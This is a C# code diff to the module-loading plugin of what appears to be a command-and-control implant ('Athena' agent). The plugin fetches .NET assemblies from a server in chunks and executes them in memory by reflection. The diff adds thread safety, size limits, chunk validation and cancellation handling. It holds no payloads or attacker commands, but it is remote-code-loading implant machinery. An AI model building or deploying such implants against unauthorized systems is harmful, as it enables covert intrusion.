@@ -17,10 +17,13 @@ namespace Agent
         private ITokenManager tokenManager { get; set; }
         private IAgentConfig config { get; set; }
         private AssemblyLoadContext assemblyLoadContext = new AssemblyLoadContext(Misc.RandomString(10));
-        //Name, Module
-        private Dictionary<string, ExecModuleArgs> module_tasks = new Dictionary<string, ExecModuleArgs>();
-        private List<AthenaModule> modules = new List<AthenaModule>();
+        private readonly ConcurrentDictionary<string, ExecModuleArgs> module_tasks = new();
+        private readonly ConcurrentDictionary<string, AthenaModule> modules = new();
+        private readonly ConcurrentDictionary<string, AthenaModule> pendingModules = new();
         private ConcurrentDictionary<string, ServerUploadJob> uploadJobs { get; set; }
+        private readonly ConcurrentDictionary<string, CancellationTokenRegistration> cancellationRegistrations = new();
+        private readonly ConcurrentDictionary<string, SemaphoreSlim> transferGates = new();
+        private const long MaximumTransferBytes = 256L * 1024 * 1024;
 
         public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
         {
@@ -49,8 +52,7 @@ namespace Agent
             //The operator indicated that the module has already been loaded
             if (string.IsNullOrEmpty(args.file))
             {
-                this.module_tasks.Add(job.task.id, args);
-                if(this.modules.Where(x=>x.name == args.name).Count() <= 0)
+                if (!modules.TryGetValue(args.name, out AthenaModule? module))
                 {
                     messageManager.AddTaskResponse(new DownloadTaskResponse
                     {
@@ -63,7 +65,7 @@ namespace Agent
                 }
 
 
-                if(!await this.ExecuteModule(args.name, job.task.id))
+                if(!await this.ExecuteModule(module, args, job.task.id, replaceLoadedModule: false))
                 {
                     messageManager.AddTaskResponse(new DownloadTaskResponse
                     {
@@ -74,8 +76,6 @@ namespace Agent
                     }.ToJson());
                     return;
                 }
-
-                this.module_tasks.Remove(job.task.id);
             }
             //Start new module loading process
             else
@@ -87,12 +87,12 @@ namespace Agent
                     entrypoint = args.entrypoint,
                 };
 
-                //Add module to our trackers, one for the task, and one for the module contents
-                this.modules.Add(mod);
-                this.module_tasks.Add(job.task.id, args);
-
                 //Start Download
                 ServerUploadJob uploadJob = new ServerUploadJob(job, config.chunk_size);
+                if (job.cancellationtokensource is not null)
+                {
+                    uploadJob.cancellationtokensource = job.cancellationtokensource;
+                }
                 uploadJob.file_id = args.file;
                 uploadJob.chunk_num = 1;
 
@@ -106,6 +106,16 @@ namespace Agent
                         completed = true,
                         task_id = job.task.id
                     }.ToJson());
+                    return;
+                }
+
+                pendingModules[job.task.id] = mod;
+                module_tasks[job.task.id] = args;
+                transferGates[job.task.id] = new SemaphoreSlim(1, 1);
+
+                RegisterCancellation(job);
+                if (!uploadJobs.ContainsKey(job.task.id))
+                {
                     return;
                 }
 
@@ -127,7 +137,7 @@ namespace Agent
 
         public async Task HandleNextMessage(ServerTaskingResponse response)
         {
-            ServerUploadJob uploadJob = this.GetJob(response.task_id);
+            ServerUploadJob? uploadJob = this.GetJob(response.task_id);
 
             //Did we get an upload job
             if (uploadJob is null)
@@ -141,6 +151,13 @@ namespace Agent
                 }.ToJson());
                 return;
             }
+
+            if (!transferGates.TryGetValue(response.task_id, out SemaphoreSlim? transferGate)) return;
+            await transferGate.WaitAsync();
+            try
+            {
+                if (!uploadJobs.TryGetValue(response.task_id, out ServerUploadJob? currentJob) ||
+                    !ReferenceEquals(currentJob, uploadJob)) return;
 
             //Did user request cancellation of the job?
             if (uploadJob.cancellationtokensource.IsCancellationRequested)
@@ -159,19 +176,31 @@ namespace Agent
             //Update the chunks required for the upload
             if (uploadJob.total_chunks == 0)
             {
-                if (response.total_chunks == 0)
+                long maximumChunks = (MaximumTransferBytes + uploadJob.chunk_size - 1L) / uploadJob.chunk_size;
+                if (response.total_chunks <= 0 || response.total_chunks > maximumChunks)
                 {
                     messageManager.AddTaskResponse(new TaskResponse
                     {
                         status = "error",
                         completed = true,
                         task_id = response.task_id,
-                        user_output = "Failed to get number of chunks",
+                        user_output = "Invalid total chunk count.",
                     }.ToJson());
+                    this.CompleteUploadJob(response.task_id);
                     return;
                 }
 
-                uploadJob.total_chunks = response.total_chunks; //Set the number of chunks provided to us from the server
+                uploadJob.total_chunks = response.total_chunks;
+            }
+            else if (response.total_chunks != uploadJob.total_chunks)
+            {
+                messageManager.AddTaskResponse(new TaskResponse
+                {
+                    status = "error", completed = true, task_id = response.task_id,
+                    user_output = "Upload total chunk count changed.",
+                }.ToJson());
+                this.CompleteUploadJob(response.task_id);
+                return;
             }
 
             //Did we get chunk data?
@@ -185,13 +214,65 @@ namespace Agent
                     user_output = "No chunk data received.",
 
                 }.ToJson());
+                this.CompleteUploadJob(response.task_id);
                 return;
             }
 
-            string module_name = this.module_tasks[uploadJob.task.id].name;
+            if (response.chunk_num != uploadJob.chunk_num || response.chunk_num > uploadJob.total_chunks)
+            {
+                messageManager.AddTaskResponse(new TaskResponse
+                {
+                    status = "error",
+                    completed = true,
+                    task_id = response.task_id,
+                    user_output = "Invalid chunk number.",
+                }.ToJson());
+                this.CompleteUploadJob(response.task_id);
+                return;
+            }
+
+            byte[] chunk;
+            try
+            {
+                chunk = Base64Transfer.Decode(response.chunk_data, uploadJob.chunk_size);
+            }
+            catch (FormatException)
+            {
+                messageManager.AddTaskResponse(new TaskResponse
+                {
+                    status = "error",
+                    completed = true,
+                    task_id = response.task_id,
+                    user_output = "Invalid chunk data.",
+                }.ToJson());
+                this.CompleteUploadJob(response.task_id);
+                return;
+            }
+            catch (ArgumentException exception)
+            {
+                messageManager.AddTaskResponse(new TaskResponse
+                {
+                    status = "error", completed = true, task_id = response.task_id,
+                    user_output = exception.Message,
+                }.ToJson());
+                this.CompleteUploadJob(response.task_id);
+                return;
+            }
+
+            if (!pendingModules.TryGetValue(response.task_id, out AthenaModule? pending) ||
+                (long)pending.fContent.Count + chunk.Length > MaximumTransferBytes)
+            {
+                messageManager.AddTaskResponse(new TaskResponse
+                {
+                    status = "error", completed = true, task_id = response.task_id,
+                    user_output = "Transfer exceeds the configured size limit.",
+                }.ToJson());
+                this.CompleteUploadJob(response.task_id);
+                return;
+            }
 
             //Write the chunk data to our stream
-            if (!this.HandleNextChunk(Misc.Base64DecodeToByteArray(response.chunk_data), module_name))
+            if (!this.HandleNextChunk(chunk, response.task_id))
             {
                 messageManager.AddTaskResponse(new TaskResponse
                 {
@@ -234,29 +315,44 @@ namespace Agent
                     },
                     completed = true
                 };
-                await this.ExecuteModule(module_name, response.task_id);
+                AthenaModule module = pendingModules[response.task_id];
+                ExecModuleArgs args = module_tasks[response.task_id];
+                bool executed = await this.ExecuteModule(module, args, response.task_id, replaceLoadedModule: true);
+                if (!executed)
+                {
+                    ur.status = "error";
+                    ur.user_output = "Failed to execute module.";
+                }
                 this.CompleteUploadJob(response.task_id);
             }
 
             //Return response
             messageManager.AddTaskResponse(ur.ToJson());
+            }
+            finally
+            {
+                transferGate.Release();
+            }
         }
-        private bool HandleNextChunk(byte[] bytes, string module_name)
+        private bool HandleNextChunk(byte[] bytes, string taskId)
         {
-            AthenaModule mod = this.modules.Where(x => x.name == module_name).FirstOrDefault();
+            if (!pendingModules.TryGetValue(taskId, out AthenaModule? mod)) return false;
             mod.fContent.AddRange(bytes);
             return true;
         }
 
-        private ServerUploadJob GetJob(string task_id)
+        private ServerUploadJob? GetJob(string task_id)
         {
-            return this.uploadJobs[task_id];
+            uploadJobs.TryGetValue(task_id, out ServerUploadJob? uploadJob);
+            return uploadJob;
         }
 
-        private async Task<bool> ExecuteModule(string module_name, string task_id)
+        private async Task<bool> ExecuteModule(
+            AthenaModule mod,
+            ExecModuleArgs args,
+            string task_id,
+            bool replaceLoadedModule)
         {
-            var mod = this.modules.Where(x => x.name == module_name).FirstOrDefault();
-
             try
             {
                 if(mod.asm is null)
@@ -275,12 +371,16 @@ namespace Agent
                     //do some error stuff
                     return false;
                 }
-                var result = method.Invoke(null, new object[] { task_id, module_tasks[task_id].GetArgs(), messageManager });
+                if (replaceLoadedModule)
+                {
+                    modules[mod.name] = mod;
+                }
+                var result = method.Invoke(null, new object[] { task_id, args.GetArgs(), messageManager });
                 return true;
             }
             catch (Exception e)
             {
-                messageManager.WriteLine(e.ToString(), task_id, true, "error");
+                messageManager.WriteLine(e.ToString(), task_id, false, "error");
             }
 
             return false;
@@ -292,15 +392,63 @@ namespace Agent
         /// <param name="task_id">The task ID of the upload job to complete</param>
         private void CompleteUploadJob(string task_id)
         {
-            if (!uploadJobs.ContainsKey(task_id))
+            if (!uploadJobs.TryRemove(task_id, out _))
             {
                 return;
             }
 
-            uploadJobs.Remove(task_id, out _);
             module_tasks.Remove(task_id, out _);
+            pendingModules.TryRemove(task_id, out _);
+            transferGates.TryRemove(task_id, out _);
+            UnregisterCancellation(task_id);
 
             this.messageManager.CompleteJob(task_id);
+        }
+
+        private void RetireUploadJob(string taskId)
+        {
+            if (!transferGates.TryGetValue(taskId, out SemaphoreSlim? transferGate))
+            {
+                CompleteUploadJob(taskId);
+                return;
+            }
+
+            transferGate.Wait();
+            try
+            {
+                CompleteUploadJob(taskId);
+            }
+            finally
+            {
+                transferGate.Release();
+            }
+        }
+
+        private void RegisterCancellation(ServerJob job)
+        {
+            if (job.cancellationtokensource is null) return;
+
+            CancellationTokenRegistration registration = job.cancellationtokensource.Token.Register(
+                static state =>
+                {
+                    var (plugin, taskId) = ((Plugin, string))state!;
+                    plugin.RetireUploadJob(taskId);
+                },
+                (this, job.task.id));
+            cancellationRegistrations[job.task.id] = registration;
+
+            if (!uploadJobs.ContainsKey(job.task.id))
+            {
+                UnregisterCancellation(job.task.id);
+            }
+        }
+
+        private void UnregisterCancellation(string taskId)
+        {
+            if (cancellationRegistrations.TryRemove(taskId, out CancellationTokenRegistration registration))
+            {
+                registration.Unregister();
+            }
         }
 
         private static MethodInfo? FindMethodInNamespace(Assembly assembly, string  methodName)
